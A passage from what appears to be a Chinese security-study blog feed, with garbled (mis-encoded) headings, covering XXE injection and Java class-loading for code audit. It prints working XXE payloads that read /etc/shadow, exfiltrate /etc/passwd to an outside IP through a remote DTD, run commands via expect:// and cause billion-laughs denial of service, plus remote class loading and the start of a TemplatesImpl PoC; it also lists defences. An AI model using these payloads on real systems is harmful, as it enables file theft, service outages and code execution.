        <content type="html"><![CDATA[<h4 id="æœ‰å›æ˜¾ï¼Œè¯»æ–‡ä»¶ï¼š"><a href="#æœ‰å›æ˜¾ï¼Œè¯»æ–‡ä»¶ï¼š" class="headerlink" title="æœ‰å›æ˜¾ï¼Œè¯»æ–‡ä»¶ï¼š"></a>æœ‰å›æ˜¾ï¼Œè¯»æ–‡ä»¶ï¼š</h4><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY ></span> &lt;!ENTITY xxe SYSTEM "file:///etc/shadow" >]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="æ— å›æ˜¾ï¼Œå¤–å¸¦ï¼š"><a href="#æ— å›æ˜¾ï¼Œå¤–å¸¦ï¼š" class="headerlink" title="æ— å›æ˜¾ï¼Œå¤–å¸¦ï¼š"></a>æ— å›æ˜¾ï¼Œå¤–å¸¦ï¼š</h4><h5 id="æœåŠ¡ç«¯"><a href="#æœåŠ¡ç«¯" class="headerlink" title="æœåŠ¡ç«¯"></a>æœåŠ¡ç«¯</h5><pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % file SYSTEM "file:///etc/passwd">&lt;!ENTITY % int "&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> send SYSTEM 'http://49.232.???.???/?p=%file;'>"><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æœ‰äº›æ—¶å€™è¯»ä¸å‡ºæ¥ï¼Œéœ€è¦ç¼–ç ã€‚</p><pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">&lt;!ENTITY % int "&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> send SYSTEM 'http://49.232.???.???/?p=%file;'>"><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre class="line-numbers language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM "http://139.9.???.???/exp/squirt1e.dtd"></span>%remote;%int;%send;]><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h4><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>     <span class="token doctype">&lt;!DOCTYPE lolz [     &lt;!ENTITY lol "lol"></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol2</span> <span class="token attr-name">"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol3</span> <span class="token attr-name">"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol4</span> <span class="token attr-name">"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol5</span> <span class="token attr-name">"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol6</span> <span class="token attr-name">"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol7</span> <span class="token attr-name">"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol8</span> <span class="token attr-name">"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol9</span> <span class="token attr-name">"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"</span><span class="token punctuation">></span></span>     ]>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lolz</span><span class="token punctuation">></span></span><span class="token entity" title="&lol9;">&amp;lol9;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lolz</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h4><p>phpéœ€è¦å®‰è£…expectæ‹“å±•ã€‚</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> <span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY ></span>&lt;!ENTITY xxe SYSTEM "expect://whoami" >]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="æ¢æµ‹å†…ç½‘"><a href="#æ¢æµ‹å†…ç½‘" class="headerlink" title="æ¢æµ‹å†…ç½‘"></a>æ¢æµ‹å†…ç½‘</h4><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> <span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY ></span>&lt;!ENTITY xxe SYSTEM "http://192.168.1.1:80" >]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="é˜²å¾¡æ‰‹æ®µ"><a href="#é˜²å¾¡æ‰‹æ®µ" class="headerlink" title="é˜²å¾¡æ‰‹æ®µ"></a>é˜²å¾¡æ‰‹æ®µ</h4><p>1.ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•</p><pre><code>PHPï¼šlibxml_disable_entity_loader(true);JAVA:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);Pythonï¼šfrom lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre><p>2.è¿‡æ»¤å’ŒéªŒè¯ç”¨æˆ·æäº¤çš„<code>XMLæ•°æ®</code></p><p>3.è¿‡æ»¤å…³é”®è¯<code>&lt;!DOCTYPE</code>ã€<code>&lt;!ENTITY SYSTEM</code>ã€<code>PUBLIC</code></p><p>4.ä¸å…è®¸XMLä¸­å«æœ‰ä»»ä½•è‡ªå·±å£°æ˜çš„<code>DTD</code></p><p>5.æœ‰æ•ˆçš„æªæ–½ï¼šé…ç½®<code>XML parser</code>åªèƒ½ä½¿ç”¨<code>é™æ€DTD</code>ï¼Œç¦æ­¢å¤–æ¥å¼•å…¥</p><p>å¯¹äº<code>Java</code>æ¥è¯´ï¼Œç›´æ¥è®¾ç½®ç›¸åº”çš„å±æ€§å€¼ä¸º<code>false</code>å³å¯</p><h4 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h4><p>1.<a href="https://www.cnblogs.com/icml8/p/16289190.html">https://www.cnblogs.com/icml8/p/16289190.html</a></p>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Trick </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaä»£ç å®¡è®¡åŸºç¡€â€”ç±»åŠ è½½</title>
      <link href="/2021/11/20/java-shen-ji-ji-chu-lei-jia-zai/"/>
      <url>/2021/11/20/java-shen-ji-ji-chu-lei-jia-zai/</url>
      
        <content type="html"><![CDATA[<p>è¿è¡ŒJavaæ—¶ï¼Œä¸ä¼šä¸€æ¬¡æ€§çš„æŠŠclassæ–‡ä»¶åŠ è½½è¿›å†…å­˜ï¼Œè€Œæ˜¯é€šè¿‡ç±»åŠ è½½æœºåˆ¶è¿›è¡ŒåŠ¨æ€åŠ è½½ï¼Œä»è€Œè½¬æ¢æˆjava.lang.Classç±»çš„ä¸€ä¸ªå®ä¾‹ã€‚</p><p>JAVAå››ç§ä¿®é¥°ç¬¦çš„è®¿é—®æƒé™çš„ï¼Œ<a href="https://blog.csdn.net/kepengs/article/details/107512618?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-107512618-blog-107726158.pc_relevant_multi_platform_whitelistv1&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-107512618-blog-107726158.pc_relevant_multi_platform_whitelistv1&utm_relevant_index=1">å›¾å‡ºè‡ªé¹é¹å“¥å“¥çš„å°çº¢å¸½</a></p><p><img src="https://img-blog.csdnimg.cn/20200722142142337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2tlcGVuZ3M=,size_16,color_FFFFFF,t_70" alt="img"></p><h4 id="ClassLoaderç±»"><a href="#ClassLoaderç±»" class="headerlink" title="ClassLoaderç±»"></a>ClassLoaderç±»</h4><p>Javaæä¾›äº†ClassLoaderç±»å®ç°ç±»åŠ è½½ã€‚</p><h5 id="loadClass-String-name-æ–¹æ³•"><a href="#loadClass-String-name-æ–¹æ³•" class="headerlink" title="loadClass(String name)æ–¹æ³•"></a>loadClass(String name)æ–¹æ³•</h5><p>åŠ è½½åç§°ä¸ºnameçš„ç±»ï¼Œè¿”å›çš„ç»“æœæ˜¯java.lang.Classç±»çš„å®ä¾‹ã€‚</p><p>é€šè¿‡é˜…è¯»æºç å¯çŸ¥ï¼ŒloadClassæ–¹æ³•çš„è¿è¡Œè¿‡ç¨‹ä¸ºï¼š</p><ol><li>è°ƒç”¨findLoadedClassæ£€æŸ¥ç±»æ˜¯å¦å·²ç»è¢«åŠ è½½ã€‚</li><li>å¦‚æœæœªè¢«åŠ è½½ï¼Œåˆ™ä½¿ç”¨åŠ è½½å™¨çš„çˆ¶ç±»åŠ è½½å™¨è¿›è¡ŒåŠ è½½ã€‚ï¼ˆé€’å½’é€çº§å‘ä¸Šæ£€æŸ¥çˆ¶ç±»åŠ è½½å™¨èƒ½å¦åŠ è½½ï¼‰</li><li>å¦‚æœçˆ¶ç±»åŠ è½½å™¨æ— æ³•å¯¹è¯¥ç±»è¿›è¡ŒåŠ è½½æ—¶ï¼Œåˆ™ä¼šè°ƒç”¨è‡ªèº«çš„findClassæ–¹æ³•ï¼Œå› æ­¤å¯ä»¥é‡å†™findClassæ–¹æ³•æ¥å®Œæˆä¸€äº›ç±»åŠ è½½çš„ç‰¹æ®Šè¦æ±‚ã€‚</li></ol><h5 id="defineClass-String-name-byte-b-int-off-int-len"><a href="#defineClass-String-name-byte-b-int-off-int-len" class="headerlink" title="defineClass(String name,byte[] b,int off,int len)"></a>defineClass(String name,byte[] b,int off,int len)</h5><p>å°†å­—èŠ‚æ•°ç»„ä¸­çš„å†…å®¹è½¬æ¢æˆJavaç±»ï¼Œè¿”å›ç»“æœæ˜¯java.lang.Classç±»çš„å®ä¾‹ï¼Œè¯¥æ–¹æ³•å£°æ˜ä¸ºfinalï¼Œæ— æ³•è¢«é‡å†™ã€‚</p><p>å› æ­¤ï¼Œé‡å†™findClassæ–¹æ³•å°±å¯ä»¥é€šè¿‡è°ƒç”¨defineClassæ¥å®ç°è‡ªå®šä¹‰åŠ è½½ç±»ã€‚</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">findClass</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>           <span class="token keyword">return</span> <span class="token function">defineClass</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> bytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bytes<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">findClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="getParent-æ–¹æ³•"><a href="#getParent-æ–¹æ³•" class="headerlink" title="getParent()æ–¹æ³•"></a>getParent()æ–¹æ³•</h5><p>è¿”å›å½“å‰ç±»åŠ è½½å™¨çš„çˆ¶ç±»åŠ è½½å™¨ã€‚</p><h5 id="resolveClass-Class-lt-gt-æ–¹æ³•"><a href="#resolveClass-Class-lt-gt-æ–¹æ³•" class="headerlink" title="resolveClass(Class&lt;?&gt;)æ–¹æ³•"></a>resolveClass(Class&lt;?&gt;)æ–¹æ³•</h5><p>é“¾æ¥æŒ‡å®šçš„Javaç±»ã€‚</p><h4 id="URLClassLoaderç±»"><a href="#URLClassLoaderç±»" class="headerlink" title="URLClassLoaderç±»"></a>URLClassLoaderç±»</h4><p>URLCIassLoaderç±»æ˜¯ClassLoaderçš„ä¸€ä¸ªå®ç°ï¼Œæ‹¥æœ‰ä»è¿œç¨‹æœåŠ¡å™¨ä¸ŠåŠ è½½ç±»çš„èƒ½åŠ›ã€‚é€šè¿‡URLCIassLoaderå¯ä»¥å®ç°å¯¹ä¸€äº›WebShellçš„è¿œç¨‹åŠ è½½ã€‚</p><p>æ­£å¸¸æƒ…å†µä¸‹ï¼ŒJavaä¼šæ ¹æ®é…ç½®é¡¹ sun.boot.class.path å’Œ java.class.path ä¸­åˆ—ä¸¾åˆ°çš„åŸºç¡€è·¯å¾„ï¼ˆè¿™äº›è·¯å¾„æ˜¯ç»è¿‡å¤„ç†åçš„ java.net.URL ç±»ï¼‰æ¥å¯»æ‰¾.classæ–‡ä»¶æ¥åŠ è½½ï¼Œè€Œè¿™ä¸ªåŸºç¡€è·¯å¾„æœ‰åˆ†ä¸ºä¸‰ç§æƒ…å†µ:</p><ol><li>URLæœªä»¥æ–œæ  &#x2F; ç»“å°¾ï¼Œåˆ™è®¤ä¸ºæ˜¯ä¸€ä¸ªJARæ–‡ä»¶ï¼Œä½¿ç”¨ JarLoader æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨JaråŒ…ä¸­å¯»æ‰¾.classæ–‡ä»¶</li><li>URLä»¥æ–œæ  &#x2F; ç»“å°¾ï¼Œä¸”åè®®åæ˜¯ file ï¼Œåˆ™ä½¿ç”¨ FileLoader æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­å¯»æ‰¾.classæ–‡ä»¶</li><li>URLä»¥æ–œæ  &#x2F; ç»“å°¾ï¼Œä¸”åè®®åä¸æ˜¯ file ï¼Œåˆ™ä½¿ç”¨æœ€åŸºç¡€çš„ Loader æ¥å¯»æ‰¾ç±»</li></ol><p>ä»¥ä¸‹ä¸ºæµ‹è¯•ä»£ç ï¼Œé€šè¿‡Helloç±»è¿œç¨‹åŠ è½½Hello1.classã€‚æ³¨æ„è¿™é‡Œæ˜¯åŒ…ç»“æ„ï¼Œå› æ­¤Hello1è¿™ä¸ªç±»ç¼–è¯‘éœ€è¦æ”¹åä¸ºcom.Hello1.classï¼Œä¸ç„¶ä¼šåŠ è½½å¤±è´¥ã€‚</p><pre class="line-numbers language-java"><code class="language-java"><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>Hello<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token keyword">package</span> com<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URLClassLoader<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hello</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        URL<span class="token punctuation">[</span><span class="token punctuation">]</span> urls <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://49.???.???.???/"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        URLClassLoader loader <span class="token operator">=</span> URLClassLoader<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>urls<span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">c</span> <span class="token operator">=</span> loader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"com.Hello1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        c<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>Hello1<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token keyword">package</span> com<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hello1</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">Hello1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hacked by Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"I am void main"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>output<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>Hacked by Squirt1e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="TemplatesImplåŠ è½½å­—èŠ‚ç "><a href="#TemplatesImplåŠ è½½å­—èŠ‚ç " class="headerlink" title="TemplatesImplåŠ è½½å­—èŠ‚ç "></a>TemplatesImplåŠ è½½å­—èŠ‚ç </h4><p>ç”±äºdefineClass()æ–¹æ³•çš„ä½œç”¨åŸŸæ˜¯protectedï¼Œå¤–éƒ¨ç±»æ˜¯æ— æ³•è°ƒç”¨çš„ã€‚å› æ­¤åœ¨è®¿é—®protectedæˆå‘˜å˜é‡æˆ–æ–¹æ³•å¿…é¡»é€šè¿‡setAccessible(true)ï¼Œå› æ­¤defineClassæ˜¯ä¸å¥½ç›´æ¥è°ƒç”¨çš„ã€‚</p><p>TemplatesImpl ç±»ä¸­å®šä¹‰äº†ä¸€ä¸ªå†…éƒ¨ç±»TransletClassLoader ï¼Œé‡å†™äº†defineClassæ–¹æ³•ã€‚</p><pre class="line-numbers language-java"><code class="language-java">        <span class="token comment" spellcheck="true">/**         * Access to final protected superclass member from outer class.         */</span>        Class <span class="token class-name">defineClass</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">defineClass</span><span class="token punctuation">(</span>null<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ²¡æœ‰å£°æ˜ä¿®é¥°ç¬¦å°±é»˜è®¤ä¸ºdefaultï¼Œå¯ä»¥ä»å¤–éƒ¨ç±»è®¿é—®ã€‚</p><p>è°ƒç”¨é“¾ï¼š</p><pre class="line-numbers language-java"><code class="language-java">TemplatesImpl#<span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>TemplatesImpl#<span class="token function">getTransletInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>TemplatesImpl#<span class="token function">defineTransletClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>TransletClassLoader#<span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>newTransformeræ–¹æ³•æ˜¯publicå¯ä»¥ç›´æ¥è°ƒç”¨ï¼Œå› æ­¤Pç‰›çš„poc(å»GitHubä¸‹ä¸ªysoserial)ã€‚</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TemplatesImpl<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TransformerFactoryImpl<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span><span class="token keyword">import</span> ysoserial<span class="token punctuation">.</span>payloads<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Reflections<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TemplateExp</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// source: bytecodes/HelloTemplateImpl.java</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token 